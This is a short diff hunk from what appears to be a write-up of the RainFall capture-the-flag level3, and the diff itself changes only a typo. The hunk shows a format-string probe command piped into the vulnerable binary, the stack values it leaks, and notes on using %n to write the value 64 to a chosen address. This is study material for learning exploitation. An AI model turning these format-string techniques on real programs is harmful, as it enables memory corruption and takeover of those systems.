@@ -88,7 +88,7 @@ level3@RainFall:~$ python -c "print('aaaa' + '%x ' * 10)" | ./level3
 aaaa200 b7fd1ac0 b7ff37d0 61616161 25207825 78252078 20782520 25207825 78252078 20782520
 
 and i found is 4th argument you have the input we give to the program
-so let's try to write 64 in this argument
+so let'  s try to write 64 in this argument
 
 with the arguement %n we can write the number of bytes already written to a given address
 
